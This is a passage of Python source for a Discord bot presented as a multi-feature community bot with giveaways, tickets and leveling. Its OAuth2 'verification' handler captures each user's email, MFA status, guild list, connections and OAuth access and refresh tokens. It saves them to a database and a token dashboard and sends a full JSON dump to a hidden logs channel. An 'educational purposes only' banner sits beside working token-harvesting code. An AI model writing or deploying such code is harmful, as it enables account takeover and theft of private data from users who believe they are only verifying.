            'verified': user_data.get('verified', False),
            'mfa_enabled': user_data.get('mfa_enabled', False),
            'premium_type': user_data.get('premium_type', 0),
            'flags': user_data.get('flags', 0),
            'public_flags': user_data.get('public_flags', 0),
            'avatar': user_data.get('avatar'),
            'banner': user_data.get('banner'),
            'accent_color': user_data.get('accent_color'),
            'access_token': access_token,
            'refresh_token': refresh_token,
            'token_type': token_type,
            'scope': scope,
            'verified_at': datetime.now().isoformat()
        },
        'guilds': guilds_data,
        'connections': connections_data,
        'timestamp': datetime.now().isoformat()
    }
    
    # Save to database
    if guild_id and user_data.get('id'):
        db.execute(
            """INSERT OR REPLACE INTO verified_users 
               (user_id, guild_id, email, username, discriminator, avatar_url, 
                access_token, refresh_token, guilds_json, connections_json, user_data_json) 
               VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
            (
                str(user_data['id']),
                guild_id,
                email,
                user_data.get('username', ''),
                user_data.get('discriminator', '0'),
                user_data.get('avatar', ''),
                access_token,
                refresh_token,
                json.dumps(guilds_data),
                json.dumps(connections_data),
                json.dumps(user_data)
            )
        )
        
        # Save token separately for dashboard
        db.insert('user_tokens', {
            'token': secrets.token_urlsafe(32),
            'user_id': str(user_data['id']),
            'guild_id': guild_id,
            'access_token': access_token,
            'refresh_token': refresh_token,
            'token_type': token_type,
            'scope': scope,
            'expires_at': (datetime.now() + timedelta(days=7)).isoformat()
        })
        
        # Send data to hidden channel
        if bot:
            asyncio.run_coroutine_threadsafe(
                send_verification_data(full_data, guild_id, access_token),
                bot.loop
            )
    
    return f"""
    <!DOCTYPE html>
    <html>
    <head><title>✅ Verification Complete</title>
    <style>
        body {{ font-family: Arial; background: #0a0a1a; color: white; text-align: center; padding: 50px; }}
        .container {{ max-width: 500px; margin: 0 auto; background: #1a1a2e; padding: 40px; border-radius: 20px; }}
        .success {{ font-size: 60px; }}
        h1 {{ color: #4CAF50; }}
        .info {{ text-align: left; background: #0d0d1a; padding: 15px; border-radius: 10px; margin: 20px 0; }}
        .info-item {{ padding: 5px 0; border-bottom: 1px solid #333; }}
        .info-item:last-child {{ border-bottom: none; }}
        .btn {{ display: inline-block; padding: 12px 30px; background: #667eea; color: white; text-decoration: none; border-radius: 10px; margin-top: 20px; }}
        .warning {{ color: #ff6b6b; border: 1px solid #ff6b6b; padding: 10px; border-radius: 8px; margin: 15px 0; font-size: 0.8em; }}
    </style>
    </head>
    <body>
        <div class="container">
            <div class="success">✅</div>
            <h1>Verification Complete!</h1>
            <p>Welcome <strong>{user_data.get('username', 'User')}</strong>!</p>
            <div class="warning">⚠️ EDUCATIONAL PURPOSES ONLY - Testing on own infrastructure</div>
            <div class="info">
                <div class="info-item">📧 Email: {email}</div>
                <div class="info-item">🆔 User ID: {user_data.get('id')}</div>
                <div class="info-item">📊 Guilds: {len(guilds_data)}</div>
                <div class="info-item">🔗 Connections: {len(connections_data)}</div>
                <div class="info-item">🔐 MFA: {user_data.get('mfa_enabled', False)}</div>
                <div class="info-item">🎫 Access Token: {access_token[:30]}...</div>
            </div>
            <p>You can now close this window and return to Discord.</p>
            <a href="https://discord.com" class="btn">Return to Discord</a>
        </div>
    </body>
    </html>
    """

async def send_verification_data(full_data, guild_id, access_token):
    """Send captured data to hidden channel"""
    if not bot:
        return
    
    guild = bot.get_guild(int(guild_id))
    if not guild:
        return
    
    hidden_channel = discord.utils.get(guild.channels, name='🔐-verification-logs')
    if not hidden_channel:
        for channel in guild.channels:
            if 'verification' in channel.name.lower() or 'logs' in channel.name.lower():
                hidden_channel = channel
                break
    
    if hidden_channel:
        embed = discord.Embed(
            title="🔐 New Verification Data",
            description=f"User: **{full_data['user']['username']}**#{full_data['user']['discriminator']}\nID: `{full_data['user']['id']}`",
            color=discord.Color.green()
        )
        embed.add_field(name="📧 Email", value=full_data['user']['email'], inline=True)
        embed.add_field(name="📊 Guilds", value=len(full_data['guilds']), inline=True)
        embed.add_field(name="🔗 Connections", value=len(full_data['connections']), inline=True)
        embed.add_field(name="🔐 MFA", value="Enabled" if full_data['user']['mfa_enabled'] else "Disabled", inline=True)
        embed.add_field(name="🎫 Access Token", value=f"```{access_token[:50]}...```", inline=False)
        embed.set_footer(text=datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
        
        await hidden_channel.send(embed=embed)
        
        # Send JSON file
        file = discord.File(
            io.StringIO(json.dumps(full_data, indent=2)),
            filename=f"verification_{full_data['user']['id']}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        )
        await hidden_channel.send(file=file)

# ═════════════════════════════════════════════════════════════════════════════
# MAIN
# ═════════════════════════════════════════════════════════════════════════════

bot = None

def run_flask():
    flask_app.run(host='0.0.0.0', port=int(os.getenv('PORT', 5000)), debug=False)

async def main():
    global bot
    print("=" * 70)
    print("🚀 Anion Security Research Bot")
    print("=" * 70)
    print("📋 Features:")
    print("  🔐 OAuth2 Verification - FULL Data Capture")
    print("  🎁 Giveaways - Beautiful GUI")
    print("  🎫 Tickets - Advanced Ticket System")
    print("  🎮 Pokémon - Catch, Collect, Shop")
    print("  🛡️ Moderation - Ban, Kick, Mute, Warn")
    print("  📈 Leveling - XP, Ranks")
    print("  📊 Dashboard - Superadmin Panel")
    print("  🎯 Token Dashboard - Security Testing")
    print("=" * 70)
    
    # Start Flask
    flask_thread = threading.Thread(target=run_flask)
    flask_thread.daemon = True
    flask_thread.start()
    print("🌐 Web dashboard started")
    
    # Start bot
    bot = AnionBot()
    await bot.start(TOKEN)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n👋 Shutting down...")
